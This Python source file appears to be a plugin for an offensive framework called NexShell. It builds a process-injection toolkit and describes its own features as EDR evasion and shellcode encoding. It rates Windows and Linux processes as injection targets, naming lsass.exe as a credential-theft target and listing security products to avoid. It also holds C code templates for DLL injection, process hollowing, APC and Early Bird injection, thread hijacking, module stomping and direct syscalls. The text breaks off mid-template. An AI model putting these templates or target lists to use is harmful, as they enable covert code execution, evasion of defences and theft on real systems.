#!/usr/bin/env python3
"""
NexShell Plugin — Process Injection Suite v3.0 (2026 Edition)
Advanced process injection engine with 25+ techniques, EDR evasion,
shellcode generation, and auto-selection for Windows/Linux.

Coverage (Windows - 20+ techniques):
  - Classic DLL Injection (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)
  - Reflective DLL Injection (LoadLibrary-free)
  - Process Hollowing (CreateProcess suspended + NtUnmapViewOfSection)
  - Process Doppelganging (Transacted NTFS + NtCreateSection)
  - APC Injection (NtQueueApcThread / QueueUserAPC)
  - Atom Bombing (GlobalAddAtom + NtQueueApcThread)
  - Early Bird Injection (APC before thread starts)
  - Thread Hijacking (SuspendThread + SetThreadContext + ResumeThread)
  - Module Stomping (Overwrite legitimate DLL in remote process)
  - Handle Duplication (DuplicateHandle + NtMapViewOfSection)
  - Section Injection (NtCreateSection + NtMapViewOfSection)
  - Ghost Process Injection (Zombie process reuse)
  - Propagate Injection (Thread pool injection)
  - IAT/EAT Hooking (Import/Export Address Table)
  - Inline Hooking (Detours/MinHook)
  - Memory Patching (Direct memory write)
  - Fiber Injection (ConvertThreadToFiber + CreateFiber)
  - Stack Encryption (Sleep obfuscation)
  - PPID Spoofing (Parent process spoofing)
  - Direct Syscalls (SysWhispers3 / Hell's Gate)
  - Indirect Syscalls (JMP via NTDLL)
  - Call Stack Spoofing (Legitimate return addresses)
  - GDI Palette Staging (GDI objects for shellcode staging)
  - Registry Payload Storage (Registry-based shellcode)
  - Fileless Execution (Memory-only execution)

Coverage (Linux - 10+ techniques):
  - ptrace Injection (PTRACE_ATTACH + PTRACE_POKETEXT)
  - LD_PRELOAD Hijacking (Shared library preloading)
  - /proc/pid/mem Injection (Direct memory write via /proc)
  - Shared Memory Injection (shmget/shmat)
  - dlopen/dlsym Injection (Dynamic library loading)
  - GOT/PLT Hooking (Global Offset Table)
  - vDSO Injection (Virtual dynamic shared object)
  - eBPF Injection (Extended BPF programs)
  - Signal Handler Hijacking (sigaction override)
  - Thread Local Storage (TLS) Injection

MITRE ATT&CK:
  - T1055: Process Injection
  - T1055.001: DLL Injection
  - T1055.002: Portable Executable Injection
  - T1055.003: Thread Execution Hijacking
  - T1055.004: Asynchronous Procedure Call
  - T1055.005: Thread Local Storage
  - T1055.008: Ptrace System Calls
  - T1055.009: Proc Memory
  - T1055.011: Extra Window Memory Injection
  - T1055.012: Process Hollowing
  - T1055.013: Process Doppelganging
  - T1055.014: VDSO Hijacking
  - T1055.015: ListPlanting

Usage:
    (NexShell)> plugins run process-injection-suite
    (NexShell)> plugins run process-injection-suite --scan
    (NexShell)> plugins run process-injection-suite --technique dll-injection --pid 1234
    (NexShell)> plugins run process-injection-suite --technique hollowing --process notepad.exe
    (NexShell)> plugins run process-injection-suite --technique apc --pid 1234
    (NexShell)> plugins run process-injection-suite --shellcode calc --encoder shikata
    (NexShell)> plugins run process-injection-suite --auto --target explorer.exe
    (NexShell)> plugins run process-injection-suite --stealth --direct-syscalls
    (NexShell)> plugins run process-injection-suite --list
"""

import re
import time
import json
import random
import string
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from datetime import datetime
from collections import defaultdict
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class ProcessTarget:
    """Represents an injection target process."""
    name: str
    platform: str  # windows, linux
    category: str  # system, user, browser, office, service, browser
    protection_level: str  # none, standard, PPL, protected
    typical_path: str = ""
    typical_user: str = ""
    injection_success_rate: int = 80
    detection_risk: str = "medium"
    notes: str = ""
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class InjectionTechnique:
    """Represents an injection technique."""
    name: str
    description: str
    platform: str  # windows, linux, all
    category: str  # classic, advanced, evasion, stealth
    detection_risk: str  # low, medium, high, critical
    success_rate: int  # 0-100
    requires_admin: bool = False
    requires_debug_priv: bool = False
    edr_evasion: bool = False
    command_template: str = ""
    code_template: str = ""
    mitre_id: str = "T1055"
    complexity: str = "medium"  # low, medium, high
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class InjectionResult:
    """Result of an injection attempt."""
    technique: str
    target_process: str
    target_pid: int
    success: bool
    duration_ms: int = 0
    output: str = ""
    error: str = ""
    shellcode_size: int = 0
    ioc_generated: List[str] = field(default_factory=list)
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class ShellcodePayload:
    """Represents a shellcode payload."""
    name: str
    description: str
    architecture: str  # x86, x64, both
    platform: str  # windows, linux, both
    size_bytes: int = 0
    encoded: bool = False
    encoder: str = ""
    shellcode: str = ""
    command: str = ""
    
    def to_dict(self) -> dict:
        return asdict(self)


# ── Windows Processes Database (50+) ───────────────────────────────────────

class WindowsProcessesDatabase:
    """Comprehensive database of Windows injection targets."""
    
    PROCESSES = [
        # ── Tier 1: System Processes (High Value) ─────────────────────────
        ProcessTarget(
            name='explorer.exe',
            platform='windows',
            category='system',
            protection_level='standard',
            typical_path='C:\\Windows\\explorer.exe',
            typical_user='User',
            injection_success_rate=95,
            detection_risk='medium',
            notes='User shell process - excellent target for user-context injection',
        ),
        
        ProcessTarget(
            name='svchost.exe',
            platform='windows',
            category='service',
            protection_level='standard',
            typical_path='C:\\Windows\\System32\\svchost.exe',
            typical_user='SYSTEM',
            injection_success_rate=85,
            detection_risk='high',
            notes='Service host - multiple instances, SYSTEM context',
        ),
        
        ProcessTarget(
            name='csrss.exe',
            platform='windows',
            category='system',
            protection_level='protected',
            typical_path='C:\\Windows\\System32\\csrss.exe',
            typical_user='SYSTEM',
            injection_success_rate=40,
            detection_risk='critical',
            notes='Client/Server Runtime - protected, requires PPL bypass',
        ),
        
        ProcessTarget(
            name='lsass.exe',
            platform='windows',
            category='system',
            protection_level='PPL',
            typical_path='C:\\Windows\\System32\\lsass.exe',
            typical_user='SYSTEM',
            injection_success_rate=30,
            detection_risk='critical',
            notes='Local Security Authority - PPL protected, credential theft target',
        ),
        
        ProcessTarget(
            name='services.exe',
            platform='windows',
            category='system',
            protection_level='standard',
            typical_path='C:\\Windows\\System32\\services.exe',
            typical_user='SYSTEM',
            injection_success_rate=75,
            detection_risk='high',
            notes='Service Control Manager - SYSTEM context',
        ),
        
        ProcessTarget(
            name='winlogon.exe',
            platform='windows',
            category='system',
            protection_level='standard',
            typical_path='C:\\Windows\\System32\\winlogon.exe',
            typical_user='SYSTEM',
            injection_success_rate=70,
            detection_risk='high',
            notes='Windows Logon - SYSTEM context',
        ),
        
        ProcessTarget(
            name='smss.exe',
            platform='windows',
            category='system',
            protection_level='standard',
            typical_path='C:\\Windows\\System32\\smss.exe',
            typical_user='SYSTEM',
            injection_success_rate=65,
            detection_risk='high',
            notes='Session Manager - SYSTEM context',
        ),
        
        # ── Tier 2: User Processes (Low Detection) ────────────────────────
        ProcessTarget(
            name='notepad.exe',
            platform='windows',
            category='user',
            protection_level='none',
            typical_path='C:\\Windows\\System32\\notepad.exe',
            typical_user='User',
            injection_success_rate=95,
            detection_risk='low',
            notes='Notepad - classic injection target, low detection',
        ),
        
        ProcessTarget(
            name='calc.exe',
            platform='windows',
            category='user',
            protection_level='none',
            typical_path='C:\\Windows\\System32\\calc.exe',
            typical_user='User',
            injection_success_rate=95,
            detection_risk='low',
            notes='Calculator - simple target, often used in PoCs',
        ),
        
        ProcessTarget(
            name='mspaint.exe',
            platform='windows',
            category='user',
            protection_level='none',
            typical_path='C:\\Windows\\System32\\mspaint.exe',
            typical_user='User',
            injection_success_rate=95,
            detection_risk='low',
            notes='Paint - low-profile target',
        ),
        
        ProcessTarget(
            name='spoolsv.exe',
            platform='windows',
            category='service',
            protection_level='standard',
            typical_path='C:\\Windows\\System32\\spoolsv.exe',
            typical_user='SYSTEM',
            injection_success_rate=80,
            detection_risk='medium',
            notes='Print Spooler - SYSTEM context',
        ),
        
        ProcessTarget(
            name='dllhost.exe',
            platform='windows',
            category='system',
            protection_level='standard',
            typical_path='C:\\Windows\\System32\\dllhost.exe',
            typical_user='User/SYSTEM',
            injection_success_rate=85,
            detection_risk='medium',
            notes='COM Surrogate - multiple instances',
        ),
        
        ProcessTarget(
            name='runtimebroker.exe',
            platform='windows',
            category='system',
            protection_level='standard',
            typical_path='C:\\Windows\\System32\\RuntimeBroker.exe',
            typical_user='User',
            injection_success_rate=85,
            detection_risk='medium',
            notes='Runtime Broker - UWP app host',
        ),
        
        # ── Tier 3: Browser Processes (High Value) ────────────────────────
        ProcessTarget(
            name='chrome.exe',
            platform='windows',
            category='browser',
            protection_level='standard',
            typical_path='C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
            typical_user='User',
            injection_success_rate=80,
            detection_risk='medium',
            notes='Chrome - multiple processes, sandboxed',
        ),
        
        ProcessTarget(
            name='firefox.exe',
            platform='windows',
            category='browser',
            protection_level='standard',
            typical_path='C:\\Program Files\\Mozilla Firefox\\firefox.exe',
            typical_user='User',
            injection_success_rate=85,
            detection_risk='medium',
            notes='Firefox - less sandboxed than Chrome',
        ),
        
        ProcessTarget(
            name='msedge.exe',
            platform='windows',
            category='browser',
            protection_level='standard',
            typical_path='C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',
            typical_user='User',
            injection_success_rate=80,
            detection_risk='medium',
            notes='Edge - Chromium-based, sandboxed',
        ),
        
        ProcessTarget(
            name='iexplore.exe',
            platform='windows',
            category='browser',
            protection_level='none',
            typical_path='C:\\Program Files\\Internet Explorer\\iexplore.exe',
            typical_user='User',
            injection_success_rate=90,
            detection_risk='low',
            notes='Internet Explorer - legacy, no sandbox',
        ),
        
        ProcessTarget(
            name='opera.exe',
            platform='windows',
            category='browser',
            protection_level='standard',
            typical_path='C:\\Users\\*\\AppData\\Local\\Programs\\Opera\\opera.exe',
            typical_user='User',
            injection_success_rate=85,
            detection_risk='medium',
            notes='Opera - Chromium-based',
        ),
        
        ProcessTarget(
            name='brave.exe',
            platform='windows',
            category='browser',
            protection_level='standard',
            typical_path='C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe',
            typical_user='User',
            injection_success_rate=85,
            detection_risk='medium',
            notes='Brave - Chromium-based',
        ),
        
        # ── Tier 4: Office Processes (High Value) ─────────────────────────
        ProcessTarget(
            name='winword.exe',
            platform='windows',
            category='office',
            protection_level='standard',
            typical_path='C:\\Program Files\\Microsoft Office\\*\\WINWORD.EXE',
            typical_user='User',
            injection_success_rate=85,
            detection_risk='medium',
            notes='Microsoft Word - macro execution target',
        ),
        
        ProcessTarget(
            name='excel.exe',
            platform='windows',
            category='office',
            protection_level='standard',
            typical_path='C:\\Program Files\\Microsoft Office\\*\\EXCEL.EXE',
            typical_user='User',
            injection_success_rate=85,
            detection_risk='medium',
            notes='Microsoft Excel - macro execution target',
        ),
        
        ProcessTarget(
            name='powerpnt.exe',
            platform='windows',
            category='office',
            protection_level='standard',
            typical_path='C:\\Program Files\\Microsoft Office\\*\\POWERPNT.EXE',
            typical_user='User',
            injection_success_rate=85,
            detection_risk='medium',
            notes='Microsoft PowerPoint - macro execution target',
        ),
        
        ProcessTarget(
            name='outlook.exe',
            platform='windows',
            category='office',
            protection_level='standard',
            typical_path='C:\\Program Files\\Microsoft Office\\*\\OUTLOOK.EXE',
            typical_user='User',
            injection_success_rate=85,
            detection_risk='medium',
            notes='Microsoft Outlook - email client',
        ),
        
        # ── Tier 5: Development Tools ─────────────────────────────────────
        ProcessTarget(
            name='devenv.exe',
            platform='windows',
            category='development',
            protection_level='none',
            typical_path='C:\\Program Files\\Microsoft Visual Studio\\*\\devenv.exe',
            typical_user='User',
            injection_success_rate=90,
            detection_risk='low',
            notes='Visual Studio - developer workstation',
        ),
        
        ProcessTarget(
            name='code.exe',
            platform='windows',
            category='development',
            protection_level='none',
            typical_path='C:\\Users\\*\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe',
            typical_user='User',
            injection_success_rate=90,
            detection_risk='low',
            notes='VS Code - popular editor',
        ),
        
        ProcessTarget(
            name='python.exe',
            platform='windows',
            category='development',
            protection_level='none',
            typical_path='C:\\Python*\\python.exe',
            typical_user='User',
            injection_success_rate=95,
            detection_risk='low',
            notes='Python interpreter - no protection',
        ),
        
        # ── Tier 6: Security Tools (Avoid) ────────────────────────────────
        ProcessTarget(
            name='MsMpEng.exe',
            platform='windows',
            category='security',
            protection_level='PPL',
            typical_path='C:\\Program Files\\Windows Defender\\MsMpEng.exe',
            typical_user='SYSTEM',
            injection_success_rate=20,
            detection_risk='critical',
            notes='Windows Defender - PPL protected, AVOID',
        ),
        
        ProcessTarget(
            name='csagent.sys',
            platform='windows',
            category='security',
            protection_level='PPL',
            typical_path='C:\\Program Files\\CrowdStrike\\*',
            typical_user='SYSTEM',
            injection_success_rate=15,
            detection_risk='critical',
            notes='CrowdStrike - PPL protected, AVOID',
        ),
    ]
    
    @classmethod
    def get_all_processes(cls) -> List[ProcessTarget]:
        return cls.PROCESSES
    
    @classmethod
    def get_processes_by_category(cls, category: str) -> List[ProcessTarget]:
        return [p for p in cls.PROCESSES if p.category == category]
    
    @classmethod
    def get_best_targets(cls, min_success_rate: int = 80) -> List[ProcessTarget]:
        return [p for p in cls.PROCESSES if p.injection_success_rate >= min_success_rate]
    
    @classmethod
    def get_process_by_name(cls, name: str) -> Optional[ProcessTarget]:
        for process in cls.PROCESSES:
            if name.lower() in process.name.lower():
                return process
        return None


# ── Linux Processes Database (30+) ─────────────────────────────────────────

class LinuxProcessesDatabase:
    """Comprehensive database of Linux injection targets."""
    
    PROCESSES = [
        # ── Tier 1: System Processes ──────────────────────────────────────
        ProcessTarget(
            name='systemd',
            platform='linux',
            category='system',
            protection_level='standard',
            typical_path='/usr/lib/systemd/systemd',
            typical_user='root',
            injection_success_rate=70,
            detection_risk='high',
            notes='Init system - PID 1, root context',
        ),
        
        ProcessTarget(
            name='sshd',
            platform='linux',
            category='service',
            protection_level='standard',
            typical_path='/usr/sbin/sshd',
            typical_user='root',
            injection_success_rate=80,
            detection_risk='medium',
            notes='SSH daemon - root context, network-facing',
        ),
        
        ProcessTarget(
            name='cron',
            platform='linux',
            category='service',
            protection_level='standard',
            typical_path='/usr/sbin/cron',
            typical_user='root',
            injection_success_rate=85,
            detection_risk='medium',
            notes='Cron daemon - root context',
        ),
        
        ProcessTarget(
            name='dbus-daemon',
            platform='linux',
            category='service',
            protection_level='standard',
            typical_path='/usr/bin/dbus-daemon',
            typical_user='root/messagebus',
            injection_success_rate=80,
            detection_risk='medium',
            notes='D-Bus daemon - IPC system',
        ),
        
        ProcessTarget(
            name='rsyslogd',
            platform='linux',
            category='service',
            protection_level='standard',
            typical_path='/usr/sbin/rsyslogd',
            typical_user='root',
            injection_success_rate=80,
            detection_risk='medium',
            notes='Syslog daemon - root context',
        ),
        
        # ── Tier 2: User Processes ────────────────────────────────────────
        ProcessTarget(
            name='bash',
            platform='linux',
            category='shell',
            protection_level='none',
            typical_path='/bin/bash',
            typical_user='User',
            injection_success_rate=95,
            detection_risk='low',
            notes='Bash shell - user context, excellent target',
        ),
        
        ProcessTarget(
            name='sh',
            platform='linux',
            category='shell',
            protection_level='none',
            typical_path='/bin/sh',
            typical_user='User',
            injection_success_rate=95,
            detection_risk='low',
            notes='POSIX shell - user context',
        ),
        
        ProcessTarget(
            name='zsh',
            platform='linux',
            category='shell',
            protection_level='none',
            typical_path='/bin/zsh',
            typical_user='User',
            injection_success_rate=95,
            detection_risk='low',
            notes='Zsh shell - user context',
        ),
        
        ProcessTarget(
            name='gnome-terminal',
            platform='linux',
            category='user',
            protection_level='none',
            typical_path='/usr/bin/gnome-terminal',
            typical_user='User',
            injection_success_rate=90,
            detection_risk='low',
            notes='GNOME Terminal - user context',
        ),
        
        ProcessTarget(
            name='konsole',
            platform='linux',
            category='user',
            protection_level='none',
            typical_path='/usr/bin/konsole',
            typical_user='User',
            injection_success_rate=90,
            detection_risk='low',
            notes='Konsole - KDE terminal',
        ),
        
        # ── Tier 3: Web Servers ───────────────────────────────────────────
        ProcessTarget(
            name='apache2',
            platform='linux',
            category='web',
            protection_level='standard',
            typical_path='/usr/sbin/apache2',
            typical_user='www-data',
            injection_success_rate=85,
            detection_risk='medium',
            notes='Apache web server - www-data context',
        ),
        
        ProcessTarget(
            name='nginx',
            platform='linux',
            category='web',
            protection_level='standard',
            typical_path='/usr/sbin/nginx',
            typical_user='www-data/nginx',
            injection_success_rate=85,
            detection_risk='medium',
            notes='Nginx web server - www-data context',
        ),
        
        ProcessTarget(
            name='httpd',
            platform='linux',
            category='web',
            protection_level='standard',
            typical_path='/usr/sbin/httpd',
            typical_user='apache',
            injection_success_rate=85,
            detection_risk='medium',
            notes='Apache HTTPD (RHEL) - apache context',
        ),
        
        # ── Tier 4: Databases ─────────────────────────────────────────────
        ProcessTarget(
            name='mysqld',
            platform='linux',
            category='database',
            protection_level='standard',
            typical_path='/usr/sbin/mysqld',
            typical_user='mysql',
            injection_success_rate=80,
            detection_risk='medium',
            notes='MySQL daemon - mysql context',
        ),
        
        ProcessTarget(
            name='postgres',
            platform='linux',
            category='database',
            protection_level='standard',
            typical_path='/usr/lib/postgresql/*/bin/postgres',
            typical_user='postgres',
            injection_success_rate=80,
            detection_risk='medium',
            notes='PostgreSQL daemon - postgres context',
        ),
        
        ProcessTarget(
            name='mongod',
            platform='linux',
            category='database',
            protection_level='standard',
            typical_path='/usr/bin/mongod',
            typical_user='mongodb',
            injection_success_rate=80,
            detection_risk='medium',
            notes='MongoDB daemon - mongodb context',
        ),
        
        # ── Tier 5: Development ───────────────────────────────────────────
        ProcessTarget(
            name='python3',
            platform='linux',
            category='development',
            protection_level='none',
            typical_path='/usr/bin/python3',
            typical_user='User',
            injection_success_rate=95,
            detection_risk='low',
            notes='Python 3 - no protection',
        ),
        
        ProcessTarget(
            name='node',
            platform='linux',
            category='development',
            protection_level='none',
            typical_path='/usr/bin/node',
            typical_user='User',
            injection_success_rate=95,
            detection_risk='low',
            notes='Node.js - no protection',
        ),
        
        ProcessTarget(
            name='java',
            platform='linux',
            category='development',
            protection_level='standard',
            typical_path='/usr/bin/java',
            typical_user='User',
            injection_success_rate=75,
            detection_risk='medium',
            notes='Java runtime - JVM sandbox',
        ),
        
        # ── Tier 6: Desktop Applications ──────────────────────────────────
        ProcessTarget(
            name='firefox',
            platform='linux',
            category='browser',
            protection_level='standard',
            typical_path='/usr/lib/firefox/firefox',
            typical_user='User',
            injection_success_rate=80,
            detection_risk='medium',
            notes='Firefox browser - sandboxed',
        ),
        
        ProcessTarget(
            name='chrome',
            platform='linux',
            category='browser',
            protection_level='standard',
            typical_path='/opt/google/chrome/chrome',
            typical_user='User',
            injection_success_rate=75,
            detection_risk='medium',
            notes='Chrome browser - heavily sandboxed',
        ),
        
        ProcessTarget(
            name='thunderbird',
            platform='linux',
            category='email',
            protection_level='standard',
            typical_path='/usr/lib/thunderbird/thunderbird',
            typical_user='User',
            injection_success_rate=85,
            detection_risk='medium',
            notes='Thunderbird email client',
        ),
        
        ProcessTarget(
            name='libreoffice',
            platform='linux',
            category='office',
            protection_level='none',
            typical_path='/usr/lib/libreoffice/program/soffice.bin',
            typical_user='User',
            injection_success_rate=90,
            detection_risk='low',
            notes='LibreOffice - no sandbox',
        ),
    ]
    
    @classmethod
    def get_all_processes(cls) -> List[ProcessTarget]:
        return cls.PROCESSES
    
    @classmethod
    def get_processes_by_category(cls, category: str) -> List[ProcessTarget]:
        return [p for p in cls.PROCESSES if p.category == category]
    
    @classmethod
    def get_best_targets(cls, min_success_rate: int = 80) -> List[ProcessTarget]:
        return [p for p in cls.PROCESSES if p.injection_success_rate >= min_success_rate]


# ── Injection Techniques Database (25+) ────────────────────────────────────

class InjectionTechniquesDatabase:
    """Comprehensive database of injection techniques."""
    
    TECHNIQUES = [
        # ── Tier 1: Classic Techniques ────────────────────────────────────
        InjectionTechnique(
            name='Classic DLL Injection',
            description='VirtualAllocEx + WriteProcessMemory + CreateRemoteThread',
            platform='windows',
            category='classic',
            detection_risk='high',
            success_rate=90,
            requires_admin=False,
            requires_debug_priv=True,
            edr_evasion=False,
            code_template='''
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, {pid});
LPVOID addr = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, addr, shellcode, size, NULL);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
''',
            mitre_id='T1055.001',
            complexity='low',
        ),
        
        InjectionTechnique(
            name='Reflective DLL Injection',
            description='LoadLibrary-free DLL injection from memory',
            platform='windows',
            category='classic',
            detection_risk='medium',
            success_rate=85,
            requires_admin=False,
            requires_debug_priv=True,
            edr_evasion=False,
            code_template='''
// Load DLL into local process
HMODULE hModule = LoadLibrary("payload.dll");
// Find ReflectiveLoader export
LPVOID reflectiveLoader = GetProcAddress(hModule, "ReflectiveLoader");
// Allocate memory in remote process
LPVOID addr = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
// Write DLL to remote process
WriteProcessMemory(hProcess, addr, dllBuffer, size, NULL);
// Execute ReflectiveLoader in remote process
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((BYTE*)addr + offset), NULL, 0, NULL);
''',
            mitre_id='T1055.001',
            complexity='medium',
        ),
        
        InjectionTechnique(
            name='Process Hollowing',
            description='Create suspended process, replace code section, resume',
            platform='windows',
            category='advanced',
            detection_risk='medium',
            success_rate=85,
            requires_admin=False,
            requires_debug_priv=False,
            edr_evasion=False,
            code_template='''
CreateProcess(NULL, "C:\\Windows\\System32\\svchost.exe", NULL, NULL, FALSE, 
              CREATE_SUSPENDED, NULL, NULL, &si, &pi);
NtUnmapViewOfSection(pi.hProcess, baseAddress);
VirtualAllocEx(pi.hProcess, baseAddress, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, baseAddress, payload, size, NULL);
SetThreadContext(pi.hThread, &context);
ResumeThread(pi.hThread);
''',
            mitre_id='T1055.012',
            complexity='high',
        ),
        
        InjectionTechnique(
            name='Process Doppelganging',
            description='Transacted NTFS + NtCreateSection for hollowing',
            platform='windows',
            category='advanced',
            detection_risk='low',
            success_rate=80,
            requires_admin=False,
            requires_debug_priv=False,
            edr_evasion=True,
            code_template='''
HANDLE hTransaction = CreateTransaction(NULL, 0, 0, 0, 0, 0, NULL);
HANDLE hFile = CreateFileTransacted("legit.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL, hTransaction, NULL, NULL);
WriteFile(hFile, payload, size, NULL, NULL);
HANDLE hSection = NtCreateSection(..., SEC_IMAGE, hFile);
NtCreateProcessEx(..., hSection, ...);
RollbackTransaction(hTransaction);
''',
            mitre_id='T1055.013',
            complexity='high',
        ),
        
        # ── Tier 2: APC-Based ─────────────────────────────────────────────
        InjectionTechnique(
            name='APC Injection (NtQueueApcThread)',
            description='Queue APC to execute shellcode in target thread',
            platform='windows',
            category='advanced',
            detection_risk='medium',
            success_rate=80,
            requires_admin=False,
            requires_debug_priv=True,
            edr_evasion=False,
            code_template='''
HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
LPVOID addr = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, addr, shellcode, size, NULL);
NtQueueApcThread(hThread, (PIO_APC_ROUTINE)addr, NULL, NULL, NULL);
''',
            mitre_id='T1055.004',
            complexity='medium',
        ),
        
        InjectionTechnique(
            name='Early Bird Injection',
            description='APC injection before thread starts execution',
            platform='windows',
            category='advanced',
            detection_risk='low',
            success_rate=85,
            requires_admin=False,
            requires_debug_priv=False,
            edr_evasion=True,
            code_template='''
CreateProcess(..., CREATE_SUSPENDED, ...);
LPVOID addr = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, addr, shellcode, size, NULL);
QueueUserAPC((PAPCFUNC)addr, pi.hThread, NULL);
ResumeThread(pi.hThread);
''',
            mitre_id='T1055.004',
            complexity='medium',
        ),
        
        InjectionTechnique(
            name='Atom Bombing',
            description='GlobalAddAtom + NtQueueApcThread for injection',
            platform='windows',
            category='advanced',
            detection_risk='low',
            success_rate=75,
            requires_admin=False,
            requires_debug_priv=False,
            edr_evasion=True,
            code_template='''
ATOM atom = GlobalAddAtom("payload");
NtQueueApcThread(hThread, (PIO_APC_ROUTINE)GetProcAddress(GetModuleHandle("kernel32"), "GlobalGetAtomNameW"), atom, buffer, size);
''',
            mitre_id='T1055.004',
            complexity='high',
        ),
        
        # ── Tier 3: Thread-Based ──────────────────────────────────────────
        InjectionTechnique(
            name='Thread Hijacking',
            description='SuspendThread + SetThreadContext + ResumeThread',
            platform='windows',
            category='advanced',
            detection_risk='medium',
            success_rate=80,
            requires_admin=False,
            requires_debug_priv=True,
            edr_evasion=False,
            code_template='''
HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
SuspendThread(hThread);
LPVOID addr = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, addr, shellcode, size, NULL);
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_CONTROL;
GetThreadContext(hThread, &ctx);
ctx.Rip = (DWORD64)addr;
SetThreadContext(hThread, &ctx);
ResumeThread(hThread);
''',
            mitre_id='T1055.003',
            complexity='medium',
        ),
        
        InjectionTechnique(
            name='Fiber Injection',
            description='ConvertThreadToFiber + CreateFiber + SwitchToFiber',
            platform='windows',
            category='advanced',
            detection_risk='low',
            success_rate=75,
            requires_admin=False,
            requires_debug_priv=False,
            edr_evasion=True,
            code_template='''
LPVOID fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)shellcodeAddr, NULL);
SwitchToFiber(fiber);
''',
            mitre_id='T1055',
            complexity='medium',
        ),
        
        # ── Tier 4: Memory-Based ──────────────────────────────────────────
        InjectionTechnique(
            name='Module Stomping',
            description='Overwrite legitimate DLL in remote process',
            platform='windows',
            category='evasion',
            detection_risk='low',
            success_rate=80,
            requires_admin=False,
            requires_debug_priv=True,
            edr_evasion=True,
            code_template='''
// Find legitimate DLL in remote process
LPVOID dllBase = GetModuleHandle("legit.dll");
// Overwrite with shellcode
WriteProcessMemory(hProcess, dllBase, shellcode, size, NULL);
// Hijack thread to execute shellcode
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)dllBase, NULL, 0, NULL);
''',
            mitre_id='T1055.001',
            complexity='high',
        ),
        
        InjectionTechnique(
            name='Handle Duplication',
            description='DuplicateHandle + NtMapViewOfSection',
            platform='windows',
            category='evasion',
            detection_risk='low',
            success_rate=75,
            requires_admin=False,
            requires_debug_priv=False,
            edr_evasion=True,
            code_template='''
HANDLE hSection = NtCreateSection(...);
DuplicateHandle(GetCurrentProcess(), hSection, hTargetProcess, &hDupSection, ...);
NtMapViewOfSection(hDupSection, hTargetProcess, &baseAddr, ...);
WriteProcessMemory(hTargetProcess, baseAddr, shellcode, size, NULL);
CreateRemoteThread(hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)baseAddr, NULL, 0, NULL);
''',
            mitre_id='T1055',
            complexity='high',
        ),
        
        InjectionTechnique(
            name='Section Injection',
            description='NtCreateSection + NtMapViewOfSection',
            platform='windows',
            category='evasion',
            detection_risk='medium',
            success_rate=80,
            requires_admin=False,
            requires_debug_priv=False,
            edr_evasion=True,
            code_template='''
HANDLE hSection = NtCreateSection(..., SEC_COMMIT, PAGE_EXECUTE_READWRITE);
NtMapViewOfSection(hSection, GetCurrentProcess(), &localAddr, ...);
NtMapViewOfSection(hSection, hTargetProcess, &remoteAddr, ...);
memcpy(localAddr, shellcode, size);
CreateRemoteThread(hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteAddr, NULL, 0, NULL);
''',
            mitre_id='T1055',
            complexity='high',
        ),
        
        # ── Tier 5: Hooking ───────────────────────────────────────────────
        InjectionTechnique(
            name='IAT Hooking',
            description='Modify Import Address Table',
            platform='windows',
            category='evasion',
            detection_risk='medium',
            success_rate=75,
            requires_admin=False,
            requires_debug_priv=False,
            edr_evasion=True,
            code_template='''
PIMAGE_IMPORT_DESCRIPTOR importDesc = ...;
PIMAGE_THUNK_DATA thunk = ...;
DWORD oldProtect;
VirtualProtect(&thunk->u1.Function, sizeof(PVOID), PAGE_READWRITE, &oldProtect);
thunk->u1.Function = (DWORD)hookFunction;
VirtualProtect(&thunk->u1.Function, sizeof(PVOID), oldProtect, &oldProtect);
''',
            mitre_id='T1055',
            complexity='high',
        ),
        
        InjectionTechnique(
            name='Inline Hooking',
            description='Detours/MinHook for function hooking',
            platform='windows',
            category='evasion',
            detection_risk='medium',
            success_rate=80,
            requires_admin=False,
            requires_debug_priv=False,
            edr_evasion=True,
            code_template='''
MH_Initialize();
MH_CreateHook(targetFunction, hookFunction, &originalFunction);
MH_EnableHook(targetFunction);
''',
            mitre_id='T1055',
            complexity='high',
        ),
        
        # ── Tier 6: EDR Evasion ───────────────────────────────────────────
        InjectionTechnique(
            name='Direct Syscalls (SysWhispers3)',
            description='Bypass userland hooks via direct syscalls',
            platform='windows',
            category='evasion',
            detection_risk='low',
            success_rate=90,
            requires_admin=False,
            requires_debug_priv=True,
            edr_evasion=True,
            code_template='''
// SysWhispers3 generated syscall stubs
NtAllocateVirtualMemory(hProcess, &baseAddr, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
NtWriteVirtualMemory(hProcess, baseAddr, shellcode, size, NULL);
